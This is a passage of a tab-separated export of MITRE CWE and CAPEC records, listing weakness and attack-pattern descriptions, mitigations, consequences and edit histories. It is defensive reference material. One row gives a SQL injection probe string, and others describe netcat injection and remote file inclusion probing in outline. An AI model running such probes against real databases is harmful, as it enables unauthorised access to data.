characters. This is equivalent to a blacklist, which may be incomplete (CWE-184). For example, filtering "/" is insufficient protection if the filesystem also supports the use of "\" as a directory separator. Another possible error could occur when the filtering is applied in a way that still produces dangerous data (CWE-182). For example, if "../" sequences are removed from the ".../...//" string in a sequential fashion, two instances of "../" would be removed from the original string, but the remaining characters would still form the "../" string.
20854	28	CWE Content Team
9836	35	MITRE
14760	39	2017-11-08
11182	61	Draft
6453	81	Access Control
12036	63	Quality Degradation
20179	39	2014-07-30
22548	23	An attacker exploits file location algorithms in an operating system or application by creating a file with the same name as a protected or privileged file. The attacker could manipulate the system if the attacker-created file is trusted by the operating system or an application component that attempts to load the original file. Applications often load or include external files, such as libraries or configuration files. These files should be protected against malicious manipulation. However, if the application only uses the name of the file when locating it, an attacker may be able to create a file with the same name and place it in a directory that the application will search before the directory with the legitimate file is searched. Because the attackers' file is discovered first, it would be used by the target application. This attack can be extremely destructive if the referenced file is executable and/or is granted special privileges based solely on having a particular name.
19503	39	2017-05-03
19724	28	Eric Dalci
17498	39	2009-07-27
24439	39	2008-07-01
5915	57	Primary
8044	77	Manual Static Analysis - Source Code
25148	62	updated Common_Consequences
17756	54	Medium
19776	35	MITRE
23198	80	Resources to maliciously construct components used by the manufacturer.
23875	28	CWE Content Team
14135	28	CWE Content Team
11873	79	Confidentiality
11499	54	Low
12282	101	CAPEC Content Team
20443	92	Experiment
21423	28	CWE Content Team
25073	91	Operation
24596	52	Black box methods may be able to identify evidence of race conditions via methods such as multiple simultaneous connections, which may cause the software to become instable or crash. However, race conditions with very narrow timing windows would not be detectable.
21904	62	updated Applicable_Platforms, Common_Consequences, Observed_Examples, Other_Notes, Potential_Mitigations, Theoretical_Notes, Weakness_Ordinalities
12818	32	CERT
17276	49	2004
20537	39	2008-09-08
19957	28	CWE Content Team
8051	61	Draft
9938	39	2014-07-30
23906	69	Incomplete
6437	59	Updated @Abstraction
13824	35	MITRE
10782	40	Target application server must allow remote files to be included.The malicious file must be placed on the remote machine previously.
8799	56	ChildOf
12399	39	2009-07-27
19965	62	updated Potential_Mitigations
8042	62	updated Relationships
13029	81	Integrity
10747	77	Automated Static Analysis - Source Code
22821	30	Mohamed Ali Kaafar
13812	56	ChildOf
9417	45	Base
9622	93	Defense in Depth
10286	25	Low
18566	28	CWE Content Team
18194	45	Class
15350	62	updated Description, Other_Notes
5905	39	2008-09-08
22481	62	updated Observed_Examples, Relationships
13375	59	Updated Related_Attack_Patterns
13956	79	Integrity
17839	49	2008
7838	54	High
9340	66	Authentication
12673	81	Integrity
19087	31	1000
16498	35	MITRE
15851	39	2019-01-03
18780	28	CWE Content Team
9447	35	MITRE
22552	62	updated Relationships
19564	35	MITRE
24339	88	Improper Neutralization of Substitution Characters
15272	28	CWE Content Team
22103	38	A lot of invalid data is fed to the system. Data that cannot have been generated through a legitimate transaction/request. Data is coming into the system within a short period of time and potentially from the same IP.
18760	39	2012-10-30
21735	89	Detailed
23423	101	CAPEC Content Team
21622	35	MITRE
23792	39	2008-09-08
24577	53	The MITRE Corporation
22495	23	The software utilizes a shared resource in a concurrent manner but it does not correctly synchronize access to the resource.
22929	28	CWE Content Team
24451	28	CWE Content Team
11541	62	updated References
10772	28	CWE Content Team
9032	28	CWE Content Team
19766	59	Updated Related_Attack_Patterns
18856	63	Unexpected State
18669	88	Missing Release of File Descriptor or Handle after Effective Lifetime
19976	79	Confidentiality
7838	61	Draft
18627	51	2014-06-23
9603	39	2017-11-08
16782	35	MITRE
6646	29	2nd Edition
22012	63	Modify Application Data
10095	42	Where possible, avoid marking the control as safe for scripting.
21181	54	High
8407	67	Medium
6740	103	Primary
8596	63	Execute Unauthorized Code or Commands
6929	69	Incomplete
14113	62	updated Description, Relationships
7331	35	MITRE
17352	28	Sean Eidemiller
8906	61	Draft
18743	43	Simple
6502	92	Explore
15074	35	MITRE
24363	35	MITRE
8179	28	CWE Content Team
12913	100	The MITRE Corporation
7132	47	Bypass Protection Mechanism
7934	28	CWE Content Team
9633	49	2012
14794	89	Meta
9330	39	2012-10-30
20857	86	http://www.codinghorror.com/blog/2012/04/speed-hashing.html
8531	42	Debugging information should not make its way into a production release.
16772	35	MITRE
12082	81	Availability
13931	35	MITRE
16813	35	Cigital
13281	69	Draft
5723	100	The MITRE Corporation
8997	78	High
6236	39	2011-06-01
12961	79	Authorization
15791	39	2012-05-11
7893	35	Cigital
22203	101	CAPEC Content Team
22666	62	updated Time_of_Introduction
17752	46	If the application handles error messages individually, on a one-by-one basis, this is likely to result in inconsistent error handling. The causes of errors may be lost. Also, detailed information about the causes of an error may be unintentionally returned to the user.
9516	39	2014-07-30
18834	62	updated Common_Consequences, Relationships, Taxonomy_Mappings
24018	28	CWE Content Team
23527	63	Other
13057	35	MITRE
21413	53	The MITRE Corporation
22698	39	2017-11-08
21181	78	High
23954	95	[Leverage Test API to Execute Attacks] Once an adversary has discovered a system with a sample or test API, the API is leveraged to exploit the system and/or conduct various attacks.
15310	42	While it is risky to use dynamically-generated query strings, code, or commands that mix control and data together, sometimes it may be unavoidable. Properly quote arguments and escape any special characters within those arguments. The most conservative approach is to escape or filter all characters that do not pass an extremely strict whitelist (such as everything that is not alphanumeric or white space). If some special characters are still needed, such as white space, wrap each argument in quotes after the escaping/filtering step. Be careful of argument injection (CWE-88).
14246	31	699
13282	42	Do not allow users to control names of resources used on the server side.
16072	62	updated Common_Consequences, Description, Other_Notes, Potential_Mitigations, Relationships
15460	40	Lack of anti-jam features in cellular technology (2G, 3G, 4G, LTE)
9236	35	MITRE
9486	79	Access Control
12859	39	2011-06-01
9386	35	MITRE
8743	94	A successful Reflected XSS attack can enable an adversary to elevate their privilege level and access functionality they should not otherwise be allowed to access.
8802	90	Language-Independent
8234	95	[Determines the structure of queries] Using manual or automated means, query inputs found for XPath weaknesses.
15464	35	MITRE
12000	31	1000
15863	53	The MITRE Corporation
22673	63	Alter Execution Logic
16413	62	updated Relationships, Taxonomy_Mappings
14006	35	MITRE
14613	35	MITRE
19894	35	MITRE
23397	55	CAPEC Content Team
10365	35	MITRE
10821	101	CAPEC Content Team
20177	85	10
12058	39	2011-03-29
8908	48	09
20937	31	1000
11835	28	CWE Content Team
16719	62	updated Demonstrative_Examples, Modes_of_Introduction, Relationships, Taxonomy_Mappings
24180	40	The application's UTF-8 decoder accepts and interprets illegal UTF-8 characters or non-shortest format of UTF-8 encoding.
20920	56	ChildOf
16066	62	updated Applicable_Platforms, Causal_Nature, Demonstrative_Examples, Modes_of_Introduction, Relationships, Taxonomy_Mappings
15771	56	ChildOf
10203	51	2014-06-23
7782	28	CWE Content Team
13156	39	2008-10-14
18679	102	ChildOf
22788	28	CWE Content Team
20997	104	480
21796	62	updated Relationships, Taxonomy_Mappings
6119	62	updated Time_of_Introduction
18449	35	MITRE
6299	91	Requirements
7201	73	Try to use Unicode encoding of content in Scripts in order to bypass validation routines.
15107	91	Implementation
18213	28	CWE Content Team
22793	35	MITRE
11871	35	MITRE
11529	39	2017-01-19
17142	56	CanPrecede
18319	30	Peleus Uhley
23239	50	Avoid including information that has the potential to identify and compromise your organization's security such as access to business plans, formulas, and proprietary documents.
24259	62	updated Potential_Mitigations
21858	30	Wenliang Du
12738	35	Cigital
15935	81	Integrity
18556	53	The MITRE Corporation
8807	35	MITRE
22489	79	Integrity
16431	104	75
11033	51	2014-06-23
24463	91	Implementation
9533	31	700
20535	92	Explore
9986	63	Reduce Maintainability
10208	35	MITRE
21108	73	Execute a phishing attack and send the user an e-mail convincing him to click on a link.
20595	28	Eric Dalci
12701	39	2017-11-08
20469	28	CWE Content Team
13962	48	02
9192	62	updated Observed_Examples
5788	28	CWE Content Team
11027	76	2019-09-30
18290	100	The MITRE Corporation
22938	56	PeerOf
21476	21	CLASP
17322	62	updated Potential_Mitigations, Time_of_Introduction
12270	62	updated Applicable_Platforms, Common_Consequences, Relationship_Notes
20511	43	Simple
18347	31	699
7445	23	The software, when opening a file or directory, does not sufficiently handle when the file is a Windows shortcut (.LNK) whose target is outside of the intended control sphere. This could allow an attacker to cause the software to operate on unauthorized files.
6370	103	Primary
15351	100	The MITRE Corporation
23780	103	Primary
24982	103	Primary
10891	104	386
22706	52	According to SOAR, the following detection techniques may be useful:                                         Highly cost effective:                                                                           Inspection (IEEE 1028 standard) (can apply to requirements, design, source code, etc.)                            Formal Methods / Correct-By-Construction
18432	97	Screen Temporary Files for Sensitive Information
14453	39	2018-03-27
9634	62	Removed C from Applicable_Platforms
23978	24	MITRE
18089	39	2012-05-11
23862	35	MITRE
25372	72	In some circumstances it may be possible to run arbitrary code on a victim's computer when cross-site scripting is combined with other flaws.
6806	42	Ensure that no externally-supplied requests are honored by requiring that all redirect requests include a unique nonce generated by the application [REF-483]. Be sure that the nonce is not predictable (CWE-330).
13244	47	Hide Activities
8838	101	CAPEC Content Team
7265	62	updated Relationships
12737	39	2010-02-16
5736	35	MITRE
11664	72	Data, requests, or actions taken by the attacking entity can be carried out as a spoofed benign entity.
9350	28	CWE Content Team
23684	62	updated Relationships
6214	56	CanPrecede
20705	79	Availability
19939	92	Explore
20033	28	CWE Content Team
13631	35	MITRE
12289	89	Detailed
14365	50	Implementation: Provide for network flow control and traffic shaping to control access to the resources.
15481	69	Draft
22577	23	A software system that accepts path input in the form of single dot directory exploit ('/./') without appropriate validation can lead to ambiguous path resolution and allow an attacker to traverse the file system to unintended locations or access arbitrary files.
16790	35	MITRE
9764	81	Availability
14866	76	2017-08-04
24606	81	Other
13523	91	Operation
16298	28	CWE Content Team
21356	26	Architecture and Design
23304	28	CWE Content Team
19198	39	2019-09-19
21643	62	updated Description, Other_Notes
14196	39	2009-05-27
21285	88	Insecure Storage of Sensitive Information
21424	34	When the software uses certificate pinning, the developer might not properly validate all relevant components of the certificate before pinning the certificate. This can make it difficult or expensive to test after the pinning is complete.
5932	62	updated Relationships
19526	42	Do not store unnecessarily sensitive information in the cache.
17260	85	248
15676	81	Confidentiality
8583	79	Access Control
25066	39	2012-05-11
9569	62	updated Relationships, Other_Notes, Taxonomy_Mappings
10105	59	Updated References
10754	91	Implementation
18581	55	CAPEC Content Team
22912	39	2009-03-10
15149	28	CWE Content Team
17845	36	http://www.opengroup.org/onlinepubs/009695399/functions/mkstemp.html
22838	28	CWE Content Team
11978	81	Other
24636	62	updated Demonstrative_Examples, Potential_Mitigations
18614	47	Read Data
7126	47	Read Data
18843	35	MITRE
19624	79	Authorization
6433	39	2011-03-29
21539	35	MITRE
22916	81	Confidentiality
24010	39	2014-07-30
10018	81	Confidentiality
15079	28	CWE Content Team
24184	62	updated Demonstrative_Examples
17325	28	CWE Content Team
11803	35	MITRE
5924	39	2009-10-29
8392	79	Authorization
18195	35	MITRE
23394	92	Explore
23420	91	Implementation
15340	31	1000
9667	25	Medium
6959	35	MITRE
8888	62	updated Demonstrative_Examples, References, Relationships
13778	62	updated Relationships
11088	39	2015-12-07
6590	39	2017-05-03
15290	21	PLOVER
12289	23	Adversaries know that certain binaries will be regularly executed as part of normal processing. If these binaries are not protected with the appropriate file system permissions, it could be possible to replace them with malware. This malware might be executed at higher system permission levels. A variation of this pattern is to discover self-extracting installation packages that unpack binaries to directories with weak file permissions which it does not clean up appropriately. These binaries can be replaced by malware, which can then be executed.
10766	101	CAPEC Content Team
9055	62	updated Relationships, Taxonomy_Mappings
19900	39	2014-07-30
24046	35	MITRE
12700	62	updated Relationships
6638	62	updated Related_Attack_Patterns
15099	35	MITRE
10393	103	Primary
24012	33	Xiaokang Liu
23550	73	Use a sniffer to capture packets
22474	35	MITRE
19123	50	Implementation: Patching software. There are many attack vectors for XSS on the client side and the server side. Many vulnerabilities are fixed in service packs for browser, web servers, and plug in technologies, staying current on patch release that deal with XSS countermeasures mitigates this.
21453	103	Primary
24948	101	CAPEC Content Team
11870	21	PLOVER
11676	62	updated Applicable_Platforms, Common_Consequences, Description, Observed_Examples, Potential_Mitigations, Time_of_Introduction
6930	28	CWE Content Team
19775	35	MITRE
19683	39	2012-05-11
22478	91	Architecture and Design
18852	95	[Probing] The attacker uses fuzzing tools to send random malformed messages to web server and observes for server's log or error message.
17784	62	updated Applicable_Platforms, Common_Consequences, Description, Relationships, Taxonomy_Mappings
15015	28	CWE Content Team
12417	28	CWE Content Team
14406	56	ChildOf
22014	89	Standard
13259	101	CAPEC Content Team
21271	62	updated Common_Consequences, Demonstrative_Examples, Relationships, Taxonomy_Mappings
25389	42	Where possible, avoid implementing custom authentication routines and consider using authentication capabilities as provided by the surrounding framework, operating system, or environment. These may make it easier to provide a clear separation between authentication tasks and authorization tasks.                   In environments such as the World Wide Web, the line between authentication and authorization is sometimes blurred. If custom authentication routines are required instead of those provided by the server, then these routines must be applied to every single page, since these pages could be requested directly.
25007	21	CWE Content Team
17710	28	CWE Content Team
8353	39	2008-09-08
23162	88	Authentication Bypass by Capture-replay
8784	39	2018-03-27
11418	47	Read Data
15729	81	Availability
9706	62	updated Description, Maintenance_Notes, Relationships, Relationship_Notes, Taxonomy_Mappings, Weakness_Ordinalities
12332	91	Architecture and Design
18623	89	Detailed
19690	39	2009-05-27
10585	62	updated Detection_Factors, Relationships
6709	101	CAPEC Content Team
24457	46	ActiveX controls can exercise far greater control over the operating system than typical Java or javascript. Exposed methods can be subject to various vulnerabilities, depending on the implemented behaviors of those methods, and whether input validation is performed on the provided arguments. If there is no integrity checking or origin validation, this method could be invoked by attackers.
20370	28	CWE Content Team
20170	35	MITRE
16139	35	MITRE
9202	81	Other
16770	39	2009-07-27
18177	35	MITRE
18264	79	Confidentiality
17758	63	Read Files or Directories
14106	62	updated Relationships
6620	35	MITRE
24078	102	ChildOf
11777	90	Language-Independent
6465	53	The MITRE Corporation
20613	35	MITRE
6110	28	CWE Content Team
8858	86	https://docs.google.com/document/d/1v1TkWZtrhzRLy0bYXBcdLUedXGb9njTNIJXa3u9akHM/edit?pli=1#
10640	95	Upon successful exploitation, the system either crashes or control of the program is returned to a location of the adversaries' choice. This can result in execution of arbitrary code or escalated privileges, depending upon the exploited target.
10069	23	This describes an attack where an application is forced to use a file that an attacker has corrupted. The result is often a denial of service caused by the application being unable to process the corrupted file, but other results, including the disabling of filters or access controls (if the application fails in an unsafe way rather than failing by locking down) or buffer overflows are possible.
19881	28	CWE Content Team
16122	39	2008-07-01
8348	51	2014-06-23
14137	39	2008-11-24
10246	28	CWE Content Team
24731	33	Wikipedia
7243	28	CWE Content Team
24337	31	1000
15038	28	CWE Content Team
7910	31	1000
6723	26	Implementation
6701	28	CWE Content Team
19518	35	MITRE
18772	39	2012-05-11
11624	104	552
9036	73	Use a list of probe strings to inject in parameters of known URLs. The probe strings are variants of PHP remote file inclusion payloads which include a reference to the adversary controlled remote PHP script.
20599	23	An adversary modifies content to make it contain something other than what the original content producer intended while keeping the apparent source of the content unchanged. The term content spoofing is most often used to describe modification of web pages hosted by a target to display the adversary's content instead of the owner's content. However, any content can be spoofed, including the content of email messages, file transfers, or the content of other network communication protocols. Content can be modified at the source (e.g. modifying the source file for a web page) or in transit (e.g. intercepting and modifying a message between the sender and recipient). Usually, the adversary will attempt to hide the fact that the content has been modified, but in some cases, such as with web site defacement, this is not necessary. Content Spoofing can lead to malware exposure, financial fraud (if the content governs financial transactions), privacy violations, and other unwanted outcomes.
12895	23	An attacker who is authorized to send queries to a target sends variants of expected queries in the hope that these modified queries might return information (directly or indirectly through error logs) beyond what the expected set of queries should provide. Many client applications use specific query templates when interacting with a server and often automatically fill in specific fields or attributes. For example, a client that queries an employee database might have templates such that the user only supplies the target's name and the template dictates the fields to be returned (location, position in the company, phone number, etc.). If the server does not verify that the query matches one of the expected templates, an attacker who is allowed to send normal queries could modify their query to try to return additional information. In the above example, additional information might include social security numbers or salaries. Fuzzing techniques involve sending random or malformed messages to a target and monitoring the target's response. In this particular attack, the fuzzing is applied to the format of the expected templates, creating variants that request additional information, exclude limiting clauses, or alter fields that identify the requester in order to subvert access controls. The attacker may not know the names of fields to request or how other modifications will affect the server response, but by attempting multiple plausible variants, they might eventually trigger a server response that divulges sensitive information. Other possible outcomes include server crashes and resource consumption if the unexpected queries cause the server to enter an unstable state or perform excessive computation.
6254	55	CAPEC Content Team
21239	100	The MITRE Corporation
19305	39	2008-07-01
18828	28	CWE Content Team
24167	35	MITRE
13217	39	2011-09-13
6884	104	624
6148	90	Language-Independent
11276	31	1000
12849	70	Corrigendum #1: UTF-8 Shortest Form
11322	35	MITRE
13842	90	Language-Independent
21971	94	A successful Reflected attack can allow an adversary to tamper with application data.
10477	39	2019-01-03
20477	85	611
14580	51	2014-06-23
17567	28	CWE Content Team
7679	56	ChildOf
14606	72	Often this will either reveal sensitive information which may be used for a later attack or private information stored in the server.
6944	100	The MITRE Corporation
17128	28	CWE Content Team
24235	28	CWE Content Team
22530	100	The MITRE Corporation
23297	35	MITRE
10095	91	System Configuration
11336	81	Integrity
15632	39	2017-01-19
16081	35	Cigital
6398	94	Run Arbitrary Code
17509	28	Eric Dalci
23220	61	Draft
13193	90	Java
9293	79	Confidentiality
18706	103	Primary
15497	31	1000
24002	44	SOAR Partial
18411	28	Eric Dalci
6729	28	CWE Content Team
8862	62	updated Relationships
21992	62	updated Relationships
20766	90	Language-Independent
14549	34	This weakness is introduced during the coding of an application when the developer does not include the noopener and/or noreferrer value for the rel attribute.
12679	62	updated Relationships
23559	77	Black Box
15918	35	MITRE
21202	39	2009-12-28
5786	81	Integrity
13244	79	Confidentiality
6420	62	updated Potential_Mitigations, Relationships
14419	56	ChildOf
11438	62	updated Common_Consequences, Relationships, Taxonomy_Mappings
9504	42	Use a vetted library or framework that does not allow this weakness to occur or provides constructs that make this weakness easier to avoid.                   Examples include the Safe C String Library (SafeStr) by Messier and Viega [REF-57], and the Strsafe.h library from Microsoft [REF-56]. These libraries provide safer versions of overflow-prone string-handling functions.
11479	45	Base
9874	25	Low
18067	35	MITRE
24202	35	MITRE
18493	53	The MITRE Corporation
7178	39	2008-11-24
20204	80	Simple command line attacks.
22454	63	Gain Privileges or Assume Identity
18726	62	updated Potential_Mitigations, Time_of_Introduction
23094	39	2009-03-10
19349	28	CWE Content Team
16868	79	Authorization
6628	35	MITRE
23925	35	MITRE
21174	35	MITRE
8389	62	updated Potential_Mitigations
8227	62	updated Applicable_Platforms, Description, Detection_Factors, Relationships, Other_Notes, Taxonomy_Mappings
15716	28	CWE Content Team
15939	35	MITRE
21587	62	updated Potential_Mitigations
13624	90	Assembly
7913	35	MITRE
9282	71	2003
20054	63	Gain Privileges or Assume Identity
23248	85	501
21214	51	2014-06-23
7120	102	ChildOf
25283	39	2009-07-27
14092	25	High
20295	104	404
22777	35	MITRE
13117	62	updated Common_Consequences
6110	62	updated Relationships
21497	62	updated Modes_of_Introduction, Relationships
20409	28	CWE Content Team
12234	31	699
7390	60	03
15820	103	Primary
19528	59	Updated Related_Attack_Patterns
21659	35	Cigital
19152	78	Medium
8468	62	updated Potential_Mitigations
11794	62	updated Potential_Mitigations
22886	28	CWE Content Team
20566	31	699
19784	89	Standard
11730	39	2008-07-01
21935	35	MITRE
23224	92	Explore
21194	100	The MITRE Corporation
11286	26	Architecture and Design
5791	62	updated Time_of_Introduction
11264	35	MITRE
8951	35	MITRE
17311	63	Execute Unauthorized Code or Commands
8121	23	An adversary uses TCP ACK segments to gather information about firewall or ACL configuration. The purpose of this type of scan is to discover information about filter configurations rather than port state. This type of scanning is rarely useful alone, but when combined with SYN scanning, gives a more complete picture of the type of firewall rules that are present. When a TCP ACK segment is sent to a closed port, or sent out-of-sync to a listening port, the RFC 793 expected behavior is for the device to respond with a RST. Getting RSTs back in response to a ACK scan gives the attacker useful information that can be used to infer the type of firewall present. Stateful firewalls will discard out-of-sync ACK packets, leading to no response. When this occurs the port is marked as filtered. When RSTs are received in response, the ports are marked as unfiltered, as the ACK packets solicited the expected behavior from a port. When combined with SYN techniques an attacker can gain a more complete picture of which types of packets get through to a host and thereby map out its firewall rule-set. ACK scanning, when combined with SYN scanning, also allows the adversary to analyze whether a firewall is stateful or non-stateful. If a SYN solicits a SYN/ACK or a RST and an ACK solicits a RST, the port is unfiltered by any firewall type. If a SYN solicits a SYN/ACK, but an ACK generates no response, the port is statefully filtered. When a SYN generates neither a SYN/ACK or a RST, but an ACK generates a RST, the port is statefully filtered. When neither SYN nor ACK generates any response, the port is blocked by a specific firewall rule, which can occur via any type of firewall. TCP ACK Scans are somewhat faster and more stealthy than other types of scans but often requires rather sophisticated analysis by an experienced person. A skilled adversary may use this method to map out firewall rules, but the results of ACK scanning will be less useful to a novice.
11660	88	Incorrect Ownership Assignment
19114	35	MITRE
16809	95	[Wait for a user to visit the domain] Finally, the adversary simply waits for a user to be unintentionally directed to the BitSquatted domain.
15518	28	CWE Content Team
11019	62	updated Relationships
25120	91	Architecture and Design
20599	89	Meta
11980	42	Assume all input is malicious. Use an "accept known good" input validation strategy, i.e., use a whitelist of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does.                   When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, "boat" may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as "red" or "blue."                   Do not rely exclusively on looking for malicious or malformed inputs (i.e., do not rely on a blacklist). A blacklist is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, blacklists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright.
12142	42	When allocating memory that uses sentinels to mark the end of a data structure - such as NUL bytes in strings - make sure you also include the sentinel in your calculation of the total amount of memory that must be allocated.
7005	28	CWE Content Team
23068	62	updated Other_Notes
21775	62	updated Observed_Examples
18271	39	2014-06-23
18913	59	Updated Related_Attack_Patterns
20832	28	CWE Content Team
21179	28	CWE Content Team
6209	35	Cigital
10474	62	updated Related_Attack_Patterns
18239	44	High
18985	55	CAPEC Content Team
20783	62	updated Relationships
11503	94	Denial of Service
21050	28	CWE Content Team
20899	92	Exploit
22316	23	The software uses external input to construct a pathname that should be within a restricted directory, but it does not properly neutralize '.../...//' (doubled triple dot slash) sequences that can resolve to a location that is outside of that directory.
11475	81	Integrity
8211	90	Language-Independent
8578	76	2015-11-09
15535	31	1000
16949	56	StartsWith
22937	26	Architecture and Design
17106	39	2008-07-01
15353	91	Implementation
23506	48	04
7380	35	MITRE
18522	50	If using the Firefox browser, use the NoScript plug-in that will help forbid iFrames.
19169	35	MITRE
13838	42	Consider using encryption in the cache.
9417	43	Simple
16790	39	2011-03-24
21285	46	If read access is not properly restricted, then attackers can steal the sensitive information. If write access is not properly restricted, then attackers can modify and possibly delete the data, causing incorrect results and possibly a denial of service.
25441	76	2017-08-04
8464	55	CAPEC Content Team
16200	92	Experiment
17530	31	1000
11687	35	MITRE
12734	31	1000
14174	62	updated Potential_Mitigations
15341	48	11
24172	35	MITRE
20373	39	2010-04-05
21535	56	ChildOf
24603	90	Language-Independent
16056	35	Cigital
19974	63	Read Application Data
10637	80	An attacker should be able to create a payload and deliver it to the victim's browser.
13909	73	Register the Homograph domain.
20563	35	MITRE
10443	56	ChildOf
14595	26	Implementation
13030	26	Implementation
16561	88	Incorrect Type Conversion or Cast
11552	97	TCP Options Probe
5629	23	An ActiveX control is intended for restricted use, but it has been marked as safe-for-scripting.
6263	42	Use a centralized logging mechanism that supports multiple levels of detail. Ensure that all security-related successes and failures can be logged.
24090	35	MITRE
15534	35	Cigital
9941	63	Read Files or Directories
19266	30	Yossi Gilad
23154	50	Ensure that all user-supplied input is validated before use.
20208	95	The attacker observes, filters or alters passed data of its choosing to gain access to sensitive information or to manipulate the actions of the two target components for his own purposes.
21146	35	MITRE
21975	39	2014-07-30
11391	57	Indirect
5964	51	2014-06-23
25173	35	Cigital
15789	62	updated Relationships
9802	35	MITRE
19560	70	Flash Parameter Injection: A Security Advisory
11373	39	2009-03-10
19056	35	MITRE
18461	73	Use network-level packet injection tools such as netcat to inject input
20105	35	MITRE
16449	73	Add logic to query, and use detailed error messages from the server to debug the query. For example, if adding a single quote to a query causes an error message, try : "' OR 1=1; --", or something else that would syntactically complete a hypothesized query. Iteratively refine the query.
6905	86	http://nadiana.com/python-pickle-insecure
13113	62	updated Relationships
10690	45	Variant
21902	62	updated Relationships
6395	35	Cigital
7670	63	Unexpected State
21788	26	Operation
22408	81	Integrity
9693	62	updated Relationships
6621	100	The MITRE Corporation
21072	39	2010-06-21
20395	62	updated References, Relationships
15131	31	1000
9814	58	The mode attribute of the <customErrors> tag defines whether custom or default error pages are used.
21366	22	04
22757	35	MITRE
6509	21	CWE Content Team
22328	54	High
14155	69	Incomplete
6978	35	MITRE
11072	62	updated Relationships, Taxonomy_Mappings
18778	35	MITRE
12944	39	2012-10-30
8910	28	CWE Content Team
7326	100	The MITRE Corporation
22105	39	2017-11-08
21163	28	Eric Dalci
7727	28	CWE Content Team
9012	79	Integrity
8848	34	COMMISSION: This weakness refers to an incorrect design related to an architectural security tactic.
15135	28	CWE Content Team
17410	39	2012-05-11
16251	85	519
16535	101	CAPEC Content Team
9785	61	Draft
24478	35	MITRE
13113	28	CWE Content Team
22775	35	MITRE
17531	81	Confidentiality
19601	62	updated Common_Consequences
23113	42	For any data that will be used to generate a command to be executed, keep as much of that data out of external control as possible. For example, in web applications, this may require storing the data locally in the session's state instead of sending it out to the client in a hidden form field.
15327	28	CWE Content Team
17467	62	updated Common_Consequences
16465	35	MITRE
5873	35	MITRE
17132	62	updated Potential_Mitigations, Time_of_Introduction
19809	94	A successful attack will deny the availability of the Wi-fi network to authorized users.
14842	62	updated Common_Consequences, Related_Attack_Patterns, Relationships
10343	63	Read Application Data
15517	39	2011-06-01
21607	102	ChildOf
14567	62	updated Applicable_Platforms, Modes_of_Introduction, Relationships
12754	62	added/updated demonstrative examples
6905	48	09
7033	81	Availability
21361	50	Design: Perform whitelist validation against a positive specification for command length, type, and parameters.
25302	25	Medium
14390	35	MITRE
16228	71	2009
13749	79	Confidentiality
22744	23	An attacker may take advantage of the application feature to help users recover their forgotten passwords in order to gain access into the system with the same privileges as the original user. Generally password recovery schemes tend to be weak and insecure. Most of them use only one security question . For instance, mother's maiden name tends to be a fairly popular one. Unfortunately in many cases this information is not very hard to find, especially if the attacker knows the legitimate user. These generic security questions are also re-used across many applications, thus making them even more insecure. An attacker could for instance overhear a coworker talking to a bank representative at the work place and supplying their mother's maiden name for verification purposes. An attacker can then try to log in into one of the victim's accounts, click on "forgot password" and there is a good chance that the security question there will be to provide mother's maiden name. A weak password recovery scheme totally undermines the effectiveness of a strong password scheme.
9886	23	The source code declares a variable in one scope, but the      variable is only used within a narrower scope.
13839	74	1
13548	35	MITRE
10216	88	Improper Neutralization of Comment Delimiters
25373	103	Primary
11397	81	Other
14166	62	updated Common_Consequences
20335	63	Unexpected State
13794	62	Suggested OWASP Top Ten 2004 mapping
15802	39	2011-06-01
13375	76	2017-01-09
13180	28	Sean Eidemiller
8506	35	MITRE
11729	35	MITRE
8326	63	Read Memory
19193	28	CWE Content Team
19936	28	CWE Content Team
7511	79	Authentication
22623	104	766
11561	103	Primary
18877	91	Implementation
15348	28	Eric Dalci
23593	35	MITRE
7428	59	Updated Attack_Phases
21247	28	CWE Content Team
19528	100	The MITRE Corporation
10665	51	2014-06-23
8898	35	MITRE
15869	62	updated Common_Consequences
23698	28	CWE Content Team
21280	34	REALIZATION: This weakness is caused during implementation of an architectural security tactic.
11998	23	An adversary attacks a target by providing input that causes an application to read beyond the boundary of a defined buffer. This typically occurs when a value influencing where to start or stop reading is set to reflect positions outside of the valid memory location of the buffer. This type of attack may result in exposure of sensitive information, a system crash, or arbitrary code execution.
18378	90	Language-Independent
9646	51	2014-06-23
23307	62	updated Description, Name
25296	39	2008-09-08
23745	95	[Forceful browsing] When the attacker targets the current application or another one (through CSRF vulnerabilities), the user will then be the one who perform the attacks without being aware of it. These attacks are mostly targeting application logic flaws, but it can also be used to create a widespread attack against a particular website on the user's current network (Internet or not).
9123	39	2008-07-01
13694	28	CWE Content Team
14510	28	CWE Content Team
10310	39	2014-07-30
8262	62	updated Applicable_Platforms, Relationships, Taxonomy_Mappings
7449	99	Guardent
11250	35	MITRE
24964	39	2011-06-01
13161	81	Integrity
7762	39	2009-05-27
8271	30	Jorg Schwenk
21433	56	ChildOf
15308	35	MITRE
15231	49	2006
15924	62	updated Common_Consequences
14386	39	2014-07-30
5978	42	Inputs should be decoded and canonicalized to the application's current internal representation before being validated (CWE-180). Make sure that the application does not decode the same input twice (CWE-174). Such errors could be used to bypass whitelist validation schemes by introducing dangerous inputs after they have been checked.
12530	28	CWE Content Team
18410	101	CAPEC Content Team
12297	26	Implementation
23869	35	MITRE
12175	85	44
11230	97	TCP SYN Ping
23574	62	updated Demonstrative_Examples, References, Relationships, Taxonomy_Mappings
7564	81	Confidentiality
19751	28	Sean Eidemiller
25303	39	2010-02-16
22527	100	The MITRE Corporation
13439	95	[Identify all interfaces] Determine the exposed interfaces by querying the registry as well as probably sniffing to expose interfaces that are not explicitly listed.
23843	39	2008-07-01
6971	62	updated Demonstrative_Examples
9819	28	CWE Content Team
12612	50	Strong physical security of the device.
16552	35	MITRE
15694	26	Operation
16613	45	Class
6834	62	updated Relationships, Taxonomy_Mappings
21259	88	Improper Handling of Insufficient Entropy in TRNG
20156	24	Cigital
19728	26	Operation
19211	36	http://doc.novsu.ac.ru/oreilly/tcpip/puis/ch10_05.htm
12522	39	2011-03-29
7714	28	CWE Content Team
7480	23	An adversary obtains unauthorized information due to improperly protected files. If an application stores sensitive information in a file that is not protected by proper access control, then an adversary can access the file and search for sensitive information.
19472	76	2017-05-01
23554	59	Updated Related_Attack_Patterns
19860	90	C#
9865	28	CWE Content Team
